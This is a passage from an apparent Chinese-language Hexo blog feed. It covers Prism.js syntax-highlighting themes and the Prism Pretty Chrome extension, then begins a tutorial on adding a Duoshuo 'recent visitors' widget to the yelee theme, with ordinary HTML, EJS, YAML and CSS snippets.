class="string">&quot;http://prismjs.com/themes/prism-dark.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://prismjs.com/themes/prism-twilight.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://prismjs.com/themes/prism-coy.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>除了本文列出的几种主题外，还支持其他几种，不一一列举。</p><p>就列出的这几种主题而言，个人比较喜欢 <strong>亮色的coy</strong> 主题和  <strong>暗色的dark</strong> 主题。</p><h2 id="五、基于Chrome插件：Prism-Pretty"><a href="#五、基于Chrome插件：Prism-Pretty" class="headerlink" title="五、基于Chrome插件：Prism Pretty"></a>五、基于Chrome插件：Prism Pretty</h2><blockquote><p>A Chrome Extension to format/highlight/preview HTML/JS/CSS/Markdown code with Prism.js</p></blockquote><h3 id="1-插件预览"><a href="#1-插件预览" class="headerlink" title="1. 插件预览"></a>1. 插件预览</h3><p>该插件可用于高亮显示html、js、css以及markdown语法。</p><p>实际体验后，html、js、css展示效果很不错，特别markdown语法展示效果意外的好。感觉整体插件做工精致、功能强大。不过，目前markdown代码预览样式目前无法设置。</p><p>插件设置界面如下图所示：</p><p><img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/screenshot.png" alt="Prism Pretty截图"></p><h3 id="2-内容预览"><a href="#2-内容预览" class="headerlink" title="2. 内容预览"></a>2. 内容预览</h3><p>试用了一下该插件，意外发现插件的一个强大功能：居然还能预览颜色代码内容、长度代码内容、图片链接内容等。</p><p>大家感受一下效果：</p><h4 id="预览颜色代码"><a href="#预览颜色代码" class="headerlink" title="预览颜色代码"></a>预览颜色代码</h4><p> <img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_57.png" alt="预览颜色代码"></p><h4 id="预览时间代码"><a href="#预览时间代码" class="headerlink" title="预览时间代码"></a>预览时间代码</h4><p> <img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_60.png" alt="预览时间代码"></p><h4 id="预览长度代码"><a href="#预览长度代码" class="headerlink" title="预览长度代码"></a>预览长度代码</h4><p> <img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_58.png" alt="预览长度代码"></p><h4 id="预览图片链接"><a href="#预览图片链接" class="headerlink" title="预览图片链接"></a>预览图片链接</h4><p> <img src="http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_62.png" alt="预览图片链接"></p><h2 id="六、参考文档"><a href="#六、参考文档" class="headerlink" title="六、参考文档"></a>六、参考文档</h2><ul><li><a href="http://prismjs.com/index.html">prismjs官网</a></li><li><a href="http://blog.wpjam.com/m/prism/">Prism：轻量级的 Javascript 代码高亮库</a></li><li><a href="http://c7sky.com/syntax-highlighting-with-prismjs.html">使用 Prism.js 实现漂亮的代码语法高亮</a></li><li><a href="http://prismjs.com/test.html">Prism Test drive</a></li><li><a href="https://raw.githubusercontent.com/L3au/Prism-Pretty/master/README.md">Prism Pretty说明文档</a></li><li><a href="https://github.com/L3au/Prism-Pretty">Prism Pretty</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/prismjs.jpg&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、简介&quot;&gt;&lt;a href=&quot;#一、简介&quot; class=&quot;headerlink&quot; title=&quot;一、简介&quot;&gt;&lt;/a&gt;一、简介&lt;/h2&gt;&lt;p&gt;Prism 是一款轻量、可扩展的代码语法高亮库，使用现代化的 Web 标准构建。&lt;/p&gt;
&lt;h2 id=&quot;二、为什么选择-Prism-js-？&quot;&gt;&lt;a href=&quot;#二、为什么选择-Prism-js-？&quot; class=&quot;headerlink&quot; title=&quot;二、为什么选择 Prism.js ？&quot;&gt;&lt;/a&gt;二、为什么选择 Prism.js ？&lt;/h2&gt;&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;极致易用&lt;br&gt;引用 prism.css 和 prism.js，使用合适的 HTML5 标签（code.language-xxxx），搞定！&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;天生伶俐&lt;br&gt;语言的 CSS 类是可继承的，所以你只需定义一次就能应用到多个代码片段。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;轻如鸿毛&lt;br&gt;代码压缩后只有 1.6KB。每添加一个语言平均增加 0.3-0.5KB，主题在 1KB 左右。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;快如闪电&lt;br&gt;如果可能，支持通过 Web Workers 实现并行。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;轻松扩展&lt;br&gt;定义新语言或扩展现有语法，或者新增功能都非常简单。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;丰富样式&lt;br&gt;所有的样式通过 CSS 完成，并使用合理的类名如：.comment, .string, .property 等。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;三、简单用法&quot;&gt;&lt;a href=&quot;#三、简单用法&quot; class=&quot;headerlink&quot; title=&quot;三、简单用法&quot;&gt;&lt;/a&gt;三、简单用法&lt;/h2&gt;&lt;h3 id=&quot;1-head添加主题样式&quot;&gt;&lt;a href=&quot;#1-head添加主题样式&quot; class=&quot;headerlink&quot; title=&quot;1. head添加主题样式&quot;&gt;&lt;/a&gt;1. head添加主题样式&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;rel&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;http://prismjs.com/themes/prism.css&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;2-文档末尾添加Prism-类库&quot;&gt;&lt;a href=&quot;#2-文档末尾添加Prism-类库&quot; class=&quot;headerlink&quot; title=&quot;2. 文档末尾添加Prism 类库&quot;&gt;&lt;/a&gt;2. 文档末尾添加Prism 类库&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;http://prismjs.com/prism.js&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;3-添加测试代码&quot;&gt;&lt;a href=&quot;#3-添加测试代码&quot; class=&quot;headerlink&quot; title=&quot;3. 添加测试代码&quot;&gt;&lt;/a&gt;3. 添加测试代码&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;遵循 &lt;a href=&quot;http://www.w3.org/TR/html5/grouping-content.html#the-pre-element&quot;&gt;HTML5 标准&lt;/a&gt;，Prism 使用语义化的 &lt;code&gt;pre&lt;/code&gt; 元素和 &lt;code&gt;code&lt;/code&gt; 元素来标记代码区块。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;language-css&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;code&lt;/span&gt;&amp;gt;&lt;/span&gt;p &amp;#123; color: red &amp;#125;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;code&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;pre&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;4-完整代码&quot;&gt;&lt;a href=&quot;#4-完整代码&quot; class=&quot;headerlink&quot; title=&quot;4. 完整代码&quot;&gt;&lt;/a&gt;4. 完整代码&lt;/h3&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;!DOCTYPE &lt;span class=&quot;meta-keyword&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;代码高亮类库Prism.js&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;link&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;rel&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;http://prismjs.com/themes/prism.css&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;language-css&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;code&lt;/span&gt;&amp;gt;&lt;/span&gt;p &amp;#123; color: red &amp;#125;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;code&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;pre&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;http://prismjs.com/prism.js&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&quot;5-输出样式&quot;&gt;&lt;a href=&quot;#5-输出样式&quot; class=&quot;headerlink&quot; title=&quot;5. 输出样式&quot;&gt;&lt;/a&gt;5. 输出样式&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://o7kubqw1j.bkt.clouddn.com/asserts/images/article/%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%B1%BB%E5%BA%93Prism/Snip20160825_53.png&quot; alt=&quot;Prism高亮效果&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="前端设计" scheme="http://yeshaoting.cn/categories/%E5%89%8D%E7%AB%AF%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="prism" scheme="http://yeshaoting.cn/tags/prism/"/>
    
  </entry>
  
  <entry>
    <title>yelee主题最近访客挂件</title>
    <link href="http://yeshaoting.cn/article/hexo/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2%E6%8C%82%E4%BB%B6/"/>
    <id>http://yeshaoting.cn/article/hexo/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2%E6%8C%82%E4%BB%B6/</id>
    <published>2016-08-20T06:28:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/blog9.png" title="blog" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近将博客hexo主题由原来的jacman换成高大上的yelee。<br>原来在jacman主题自定义了一些挂件，例如:多说的最近访客。<br>希望将原来的 <strong>最近访客</strong> 挂件迁移到yelee主题。</p><h2 id="二、菜单项"><a href="#二、菜单项" class="headerlink" title="二、菜单项"></a>二、菜单项</h2><h3 id="1-查找菜单项文件"><a href="#1-查找菜单项文件" class="headerlink" title="1. 查找菜单项文件"></a>1. 查找菜单项文件</h3><p>通过chrome开发者工具，查看菜单 <strong>关于我</strong> 菜单项内容元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;switch-part switch-part4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;js-aboutme&quot;</span>&gt;</span>只求成为一名靠谱的码农<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后，根据元素标签特征(这里选 <strong>switch-part4</strong> )，在yelee主题目录搜索layout目录下包含 <strong>switch-part4</strong> 的文件内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:yelee yeshaoting$ grep -ir <span class="string">&quot;switch-part4&quot;</span> layout/</span><br><span class="line">layout//_partial/left-col.ejs:                &lt;section class=<span class="string">&quot;switch-part switch-part4&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看到，该文件内容存在于 layout//_partial/left-col.ejs 目录。</p><h3 id="2-添加菜单项"><a href="#2-添加菜单项" class="headerlink" title="2. 添加菜单项"></a>2. 添加菜单项</h3><p>在left-col.ejs文件里，找到tips-box元素块，并类似aboutme添加visitor，如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tips-box hide&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tips-arrow&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;tips-inner&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&lt;%= __(&#x27;index.menu&#x27;) %&gt;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&lt;%= __(&#x27;index.tags&#x27;) %&gt;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &lt;%if(theme.friends &amp;&amp; theme.friends.length != 0)&#123;%&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&lt;%= __(&#x27;index.friends&#x27;) %&gt;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &lt;%&#125;%&gt;</span><br><span class="line">        &lt;%if(theme.aboutme)&#123;%&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&lt;%= __(&#x27;index.about&#x27;) %&gt;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &lt;%&#125;%&gt;</span><br><span class="line">        &lt;%if(theme.visitor)&#123;%&gt;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&lt;%= __(&#x27;index.visitor&#x27;) %&gt;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &lt;%&#125;%&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-菜单项名称"><a href="#3-菜单项名称" class="headerlink" title="3. 菜单项名称"></a>3. 菜单项名称</h3><p>由于主题支持多语言，因此通过 <code>__(&#39;index.visitor&#39;)</code> 这些的方法从语言包里获取对应的内容。<br>该语言文件在主题的languages目录。我的设置为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># zh-Hans: Chinese (Simplified) 大陆简体</span><br><span class="line">index:</span><br><span class="line">  menu: 菜单</span><br><span class="line">  tags: 标签</span><br><span class="line">  friends: 友情链接</span><br><span class="line">  about: 个人签名</span><br><span class="line">  visitor: 最近访客</span><br><span class="line">  more: 阅读全文</span><br><span class="line">  copy: 复制</span><br></pre></td></tr></table></figure><h3 id="4-开启菜单项"><a href="#4-开启菜单项" class="headerlink" title="4. 开启菜单项"></a>4. 开启菜单项</h3><p>注意到主题配置文件里，通过aboutme来开关“关于我”菜单项。<br>同样，我们也在配置文件里添加一项来控制“最近访客”菜单项是否展示。如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#是否开启“最近访客”功能。</span></span><br><span class="line">visitor: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="5-效果图"><a href="#5-效果图" class="headerlink" title="5. 效果图"></a>5. 效果图</h3><p>![最近访客菜单项]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2/2016-08-20">http://o7kubqw1j.bkt.clouddn.com//images/article/yelee主题最近访客/2016-08-20</a> 13-41-17.jpg)<br>![最近访客菜单项]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/yelee%E4%B8%BB%E9%A2%98%E6%9C%80%E8%BF%91%E8%AE%BF%E5%AE%A2/2016-08-20">http://o7kubqw1j.bkt.clouddn.com//images/article/yelee主题最近访客/2016-08-20</a> 13-41-17.jpg)</p><span id="more"></span><h2 id="三、最近访客详情"><a href="#三、最近访客详情" class="headerlink" title="三、最近访客详情"></a>三、最近访客详情</h2><h3 id="1-准备挂件"><a href="#1-准备挂件" class="headerlink" title="1. 准备挂件"></a>1. 准备挂件</h3><p>如果主题开启并使用了多说评论的话，只需要添加如下内容即可:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;ds-recent-visitors&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果并未开启多说评论的话，需要注册多说并额外添加多说js内容如下:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--多说js加载开始，一个页面只需要加载一次 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> duoshuoQuery = &#123;<span class="attr">short_name</span>:<span class="string">&quot;您的多说二级域名&quot;</span>&#125;;</span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> ds = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    ds.type = <span class="string">&#x27;text/javascript&#x27;</span>;ds.async = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">    ds.src = <span class="string">&#x27;http://static.duoshuo.com/embed.js&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    ds.charset = <span class="string">&#x27;UTF-8&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    (<span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>] || <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>]).appendChild(ds);</span></span><br><span class="line"><span class="javascript">&#125;)();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--多说js加载结束，一个页面只需要加载一次 --&gt;</span></span><br></pre></td></tr></table></figure><p>这部分内容为了更加通用，可以将内容写入到ejs模板文件中，然后通过加载外部模板方式引入到主题中。<br>我就是将上述内容放在自定义模板文件: <code>layout/_plugin/duoshuo_visitor.ejs</code> 。</p><p>参见:<a href="http://dev.duoshuo.com/docs/4ff28d6f552860f21f00000c">通用代码【最近访客】使用方法</a></p><h3 id="2-添加多说最近访客"><a href="#2-添加多说最近访客" class="headerlink" title="2. 添加多说最近访客"></a>2. 添加多说最近访客</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(theme.visitor)&#123;%&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;switch-part switch-part5&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;widget visitor&quot;</span> <span class="attr">id</span>=<span class="string">&quot;js-visitor&quot;</span>&gt;</span></span><br><span class="line">       &lt;%- partial(&#x27;_plugin/duoshuo_visitor&#x27;) %&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">&lt;%&#125;%&gt;</span><br></pre></td></tr></table></figure><h3 id="3-最近访客样式"><a href="#3-最近访客样式" class="headerlink" title="3. 最近访客样式"></a>3. 最近访客样式</h3><p>打开主题下 source/css/_partial/main.styl 文件。<br>找到switch-part4节点，然后类似的添加 switch-part5 内容，如下:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.switch-part4</span>&#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">300%</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: left;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.switch-part5</span>&#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">400%</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">max-height</span>: <span class="number">260px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 